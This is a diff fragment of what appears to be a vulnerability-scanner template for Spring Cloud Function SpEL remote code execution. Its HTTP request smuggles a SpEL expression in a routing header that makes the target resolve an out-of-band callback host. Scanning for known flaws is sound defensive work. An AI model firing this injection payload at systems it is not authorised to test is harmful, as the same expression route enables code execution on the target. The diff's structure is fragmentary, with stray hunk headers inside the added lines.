@@ -1,0 +1,18 @@
+info:
+  name: Spring Cloud Function SPEL RCE
+  author: Mr-xn,Adam Crosser
+  severity: critical
+  reference:
+    - https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f
+	@@ -17,7 +17,7 @@ requests:
+      - |
+        POST /functionRouter HTTP/1.1
+        Host: {{Hostname}}
+        spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("{{interactsh-url}}")
+        Content-Type: application/x-www-form-urlencoded
+        {{rand_base(8)}}
+	@@ -33,4 +33,4 @@ requests:
+
+      - type: status
+        status:
+          - 500
